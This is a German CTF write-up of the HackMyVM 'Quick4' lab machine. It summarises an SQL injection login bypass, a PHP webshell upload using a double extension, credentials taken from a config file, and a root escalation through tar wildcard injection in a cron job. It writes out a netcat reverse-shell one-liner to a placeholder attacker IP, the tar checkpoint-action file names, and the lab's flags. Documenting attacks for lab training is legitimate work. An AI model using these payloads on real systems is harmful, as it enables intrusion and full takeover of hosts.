# Quick4 - HackMyVM (Easy)

![Quick4.png](Quick4.png)

## Übersicht

*   **VM:** Quick4
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Quick4)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2024-05-11
*   **Original-Writeup:** https://alientec1908.github.io/Quick4_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Quick4" zu erlangen. Der Weg dorthin begann mit der Entdeckung einer SQL-Injection-Schwachstelle im Login des `/employee/admin.php`-Bereichs, was den Zugriff auf das Mitarbeiterportal ermöglichte. Dort wurde eine unsichere Dateiupload-Funktion (`manageemployees.php`) gefunden, die das Hochladen einer PHP-Webshell mit einer doppelten Dateiendung (z.B. `.jpeg.php`) erlaubte. Dies führte zu Remote Code Execution (RCE) als `www-data`. Als `www-data` wurden MySQL-Datenbank-Credentials (`root:fastandquicktobefaster`) in `/customer/config.php` gefunden. In der Datenbank wurden Klartextpasswörter für verschiedene Benutzer entdeckt. Die finale Rechteausweitung zu Root gelang durch Ausnutzung einer Wildcard-Injection-Schwachstelle in einem Cronjob-Skript (`/usr/local/bin/backup.sh`), das `tar` mit einem unsicheren Wildcard (`*`) im Verzeichnis `/var/www/html/` ausführte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `curl` (impliziert)
*   Burp Suite (impliziert für Request-Interception)
*   `nc` (netcat)
*   `mysql` client
*   `awk`
*   `hydra` (versucht, nicht erfolgreich für SSH)
*   `find`
*   `sudo` (versucht)
*   `ss`
*   Standard Linux-Befehle (`touch`, `chmod`, `cat`, `ls`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Quick4" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.125) mit `arp-scan` identifiziert. Hostname `quick4.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 8.9p1) und Port 80 (HTTP, Apache 2.4.52) mit dem Titel "Quick Automative - Home". `robots.txt` enthielt `Disallow: /admin/`.
    *   `nikto` und `gobuster` fanden Standardverzeichnisse sowie `/customer/` und `/careers/`. Der Zugriff auf `/admin/` schlug fehl. Das Verzeichnis `/customer/` enthielt eine PHP-Anwendung (`login.php` (Status 500), `config.php` (leer)).
    *   Mitarbeiterinformationen (Namen, E-Mails) wurden von der Webseite gesammelt.

2.  **SQL Injection & Employee Access & File Upload RCE (Initial Access als `www-data`):**
    *   Eine SQL-Injection-Schwachstelle wurde im Login-Formular von `/employee/admin.php` (Pfad erraten oder durch weitere Scans gefunden) ausgenutzt (z.B. Passwort: `' OR 1=1 -- -`), um Zugriff auf den Mitarbeiterbereich zu erlangen.
    *   Im Mitarbeiterbereich (`/employee/manageemployees.php`) wurde eine unsichere Dateiupload-Funktion für Profilbilder gefunden.
    *   Eine PHP-Reverse-Shell wurde präpariert (mit `GIF89a` am Anfang), mit `filename="rev.php"` und `Content-Type: image/jpeg` hochgeladen. Der Server speicherte die Datei mit doppelter Endung (z.B. als `/employee/uploads/USERID_rev.jpeg.php`).
    *   Durch Aufrufen der Datei mit der `.php`-Endung (z.B. `http://192.168.2.125/employee/uploads/2_revshell.jpeg.php`) wurde die Webshell ausgeführt.
    *   Eine Reverse Shell wurde zu einem Netcat-Listener (Port 4445) als `www-data` aufgebaut.

3.  **Post-Exploitation & Credential Discovery:**
    *   Als `www-data` wurde die Datei `/var/www/html/customer/config.php` gelesen. Diese enthielt MySQL-Zugangsdaten: Benutzer `root`, Passwort `fastandquicktobefaster`.
    *   Login in die lokale MySQL-Datenbank mit diesen Credentials.
    *   In der Datenbank `quick`, Tabelle `users`, wurden zahlreiche Benutzer mit ihren Passwörtern im Klartext gefunden (z.B. `nick.greenhorn:benni`, `admin:benni`).
    *   Die User-Flag (`HMV{7920c4596aad1b9826721f4cf7ca3bf0}`) wurde in `/home/user.txt` gefunden (lesbar als `www-data`).

4.  **Privilege Escalation (von `www-data` zu `root` via Cronjob Wildcard Injection):**
    *   `sudo -l` als `www-data` war nicht erfolgreich. Die SUID-Suche ergab keine einfachen Vektoren.
    *   Die Crontab (`/etc/crontab`) enthielt einen Eintrag, der minütlich als `root` das Skript `/usr/local/bin/backup.sh` ausführt.
    *   Das Skript `/usr/local/bin/backup.sh` enthielt den Befehl `cd /var/www/html/ && tar czf /var/backups/backup-website.tar.gz *`. Die Verwendung des Wildcards (`*`) ist anfällig für Wildcard Injection.
    *   Im Verzeichnis `/var/www/html/` (beschreibbar für `www-data`) wurden folgende Dateien erstellt:
        *   Ein Reverse-Shell-Skript `hacker.sh` (z.B. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ANGRIFFS_IP 5552 >/tmp/f`), das ausführbar gemacht wurde.
        *   `touch /var/www/html/--checkpoint=1`
        *   `touch /var/www/html/--checkpoint-action=exec=sh\ hacker.sh`
    *   Ein Netcat-Listener wurde auf Port 5552 gestartet.
    *   Nachdem der Cronjob lief, wurde `hacker.sh` durch `tar` als `root` ausgeführt, und eine Root-Shell wurde auf dem Listener empfangen.
    *   Die Root-Flag (`HMV{858d77929683357d07237ef3e3604597}`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **SQL Injection (Authentication Bypass):** Umgehung eines Logins durch eine SQLi-Payload im Passwortfeld.
*   **Unsicherer Dateiupload (Doppelte Endung / Content-Type Bypass):** Ermöglichte das Hochladen einer PHP-Webshell durch Umgehung von Filtern.
*   **Klartext-Datenbank-Credentials in Konfigurationsdatei:** Das MySQL-Root-Passwort war in `config.php` gespeichert.
*   **Klartextpasswörter in Datenbank:** Benutzerpasswörter für die Webanwendung waren unverschlüsselt in der Datenbank gespeichert.
*   **Cronjob Wildcard Injection (tar):** Ein als Root laufender Cronjob verwendete `tar` mit einem unsicheren Wildcard (`*`) in einem von `www-data` beschreibbaren Verzeichnis, was RCE als Root ermöglichte.

## Flags

*   **User Flag (`/home/user.txt`):** `HMV{7920c4596aad1b9826721f4cf7ca3bf0}`
*   **Root Flag (`/root/root.txt`):** `HMV{858d77929683357d07237ef3e3604597}`

## Tags

`HackMyVM`, `Quick4`, `Easy`, `SQL Injection`, `File Upload RCE`, `Double Extension Exploit`, `Database Leak`, `Cleartext Passwords`, `Cronjob Exploit`, `Wildcard Injection`, `tar Exploit`, `Linux`, `Web`, `Privilege Escalation`, `Apache`, `MySQL`
